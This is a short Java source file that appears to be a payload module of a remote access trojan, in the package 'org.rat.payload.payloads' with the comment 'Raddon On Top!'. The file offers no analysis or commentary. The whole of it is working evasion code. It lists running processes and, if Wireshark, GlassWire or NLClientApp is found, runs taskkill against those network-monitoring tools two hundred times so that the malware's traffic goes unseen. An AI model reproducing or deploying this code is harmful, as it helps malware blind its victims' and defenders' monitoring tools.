//Raddon On Top!

package org.rat.payload.payloads;

import org.rat.payload.*;
import java.io.*;

public class AntiDebugger implements IPayload
{
    public void run() {
        final StringBuilder builder = new StringBuilder();
        try {
            final BufferedReader reader = new BufferedReader(new InputStreamReader(new ProcessBuilder(new String[] { "tasklist" }).start().getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                builder.append(line + "\n");
            }
        }
        catch (IOException ex) {}
        try {
            if (builder.toString().contains("wireshark") || builder.toString().contains("NLClientApp") || builder.toString().contains("GlassWire")) {
                for (int i = 0; i < 200; ++i) {
                    Runtime.getRuntime().exec("taskkill /IM wireshark.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM NLClientApp.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM GlassWire.exe /F");
                }
            }
        }
        catch (Exception ex2) {}
    }
}
